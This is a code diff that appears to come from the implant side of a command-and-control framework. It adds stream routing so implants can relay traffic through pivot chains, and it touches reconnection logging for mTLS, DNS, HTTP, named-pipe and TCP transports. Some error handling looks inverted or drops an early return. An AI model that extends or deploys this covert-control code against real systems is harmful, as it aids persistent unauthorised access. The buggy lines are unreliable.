@@ -116,7 +116,7 @@ ConnLoop:
 			t.Conn, err = tlsConnect(t.URL.Hostname(), uint16(lport))
 			if err != nil {
 				// {{if .Config.Debug}}
-				log.Printf("[mtls] Connection failed %s", err)
+				log.Printf("[mtls] Connection failed: %s", err)
 				// {{end}}
 				connectionAttempts++
 			}
@@ -128,7 +128,7 @@ ConnLoop:
 			t.C2, err = dnsConnect(t.URL)
 			if err == nil {
 				// {{if .Config.Debug}}
-				log.Printf("[dns] Connection failed %s", err)
+				log.Printf("[dns] Connection failed: %s", err)
 				// {{end}}
 				connectionAttempts++
 			}
@@ -142,7 +142,7 @@ ConnLoop:
 			t.C2, err = httpConnect(t.URL)
 			if err == nil {
 				// {{if .Config.Debug}}
-				log.Printf("[%s] Connection failed %s", t.URL.Scheme, err)
+				log.Printf("[%s] Connection failed: %s", t.URL.Scheme, err)
 				// {{end}}
 				connectionAttempts++
 			}
@@ -154,7 +154,7 @@ ConnLoop:
 			t.Conn, err = namePipeDial(t.URL)
 			if err != nil {
 				// {{if .Config.Debug}}
-				log.Printf("[namedpipe] Connection failed %s", err)
+				log.Printf("[namedpipe] Connection failed: %s", err)
 				// {{end}}
 				connectionAttempts++
 			}
@@ -166,7 +166,7 @@ ConnLoop:
 			t.C2, err = tcpPivotConnect(t.URL)
 			if err != nil {
 				// {{if .Config.Debug}}
-				log.Printf("[tcppivot] Connection failed %s", err)
+				log.Printf("[tcppivot] Connection failed: %s", err)
 				// {{end}}
 				connectionAttempts++
 			}
@@ -174,7 +174,7 @@ ConnLoop:
 			break ConnLoop
 			// {{end}} -TCPPivotc2Enabled
 		default:
-			err = fmt.Errorf("Unknown c2 protocol %s", t.URL.Scheme)
+			err = fmt.Errorf("Unknown c2 protocol: %s", t.URL.Scheme)
 			// {{if .Config.Debug}}
 			log.Printf(err.Error())
 			// {{end}}
@@ -193,6 +193,9 @@ ConnLoop:
 			// {{end}}
 			t.phyConnFallBack()
 		} else {
+			// Setup the transport's router
+			t.Router = SetupMuxRouter(t.Multiplexer)
+
 			// If everything is fine, setup RPC C2 code over a muxed stream.
 			// This function handles all errors and edge cases.
 			t.setupMuxC2()
@@ -240,18 +243,22 @@ func (t *Transport) StartMuxPivot(conn net.Conn, routeID uint32) (err error) {
 // various types of traffic like UDP connections, and that routing will have to be efficient
 // for those as well.
 func (t *Transport) handleReverseC2(routeID uint32) (err error) {
-	// As the server is a client when setting up C2 RPC stream, we act as the server
-	// and request to open a stream. The pivoted implant is listening for this.
+
 	src, err := t.Multiplexer.Open()
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[mux] Error opening C2 stream: %s", err)
+		log.Printf("[mux] Error opening first stream: %s", err.Error())
 		// {{end}}
-		return
 	}
+
+	// Setup the transport's router
+	t.Router = SetupMuxRouter(t.Multiplexer)
 
 	// Connect back with the route ID provided and route the connection.
 	var route bon.Route = bon.Route(routeID)
+	// {{if .Config.Debug}}
+	log.Printf("[mux] Route: ID is %d", routeID)
+	// {{end}}
 
 	dst, err := ServerComms.Router.Connect(route)
 	if err != nil {
@@ -516,6 +523,57 @@ func (t *Transport) IsRouting() bool {
 	}
 	// If no mux, no routing.
 	return false
+}
+
+// SetupMuxRouter - When the first route is registered, we register a mux router.
+// After this call, the implant is able to route traffic that is being forwarded
+// by the previous node in the chain (server -> pivot -> this implant).
+func SetupMuxRouter(mux *yamux.Session) (router *bon.Bon) {
+	// {{if .Config.Debug}}
+	log.Printf("Starting mux stream router")
+	// {{end}}
+
+	r := newRouter(mux)
+	router = bon.New(r)
+
+	// We don't set default (non-matching) handlers,
+	// because no connection should arrive to the router
+	// without a defined route ID.
+
+	return
+}
+
+// router - Responsible for routing all streams muxed out of of a physical connection.
+// This router is being passed various objects drawned from transports, etc.
+// This object also wraps the multiplexer so as to be compatible with the Bon router object.
+type router struct {
+	session *yamux.Session
+}
+
+func newRouter(mux *yamux.Session) *router {
+	return &router{session: mux}
+}
+
+// Accept - The router is able to accept a new muxed stream.
+func (s *router) Accept() (net.Conn, error) {
+	// {{if .Config.Debug}}
+	log.Printf("[route] accepting new stream")
+	// {{end}}
+	return s.session.Accept()
+}
+
+// Open - The router is able to open a new stream so as to
+// forward the connection that we want to route, with a Route r.
+func (s *router) Open(r bon.Route) (net.Conn, error) {
+	// {{if .Config.Debug}}
+	log.Printf("[route] routing newly accepted stream")
+	// {{end}}
+	return s.session.Open()
+}
+
+// Close - The router can close the multiplexer session.
+func (s *router) Close() error {
+	return s.session.Close()
 }
 
 func transport(rw1, rw2 io.ReadWriter) error {
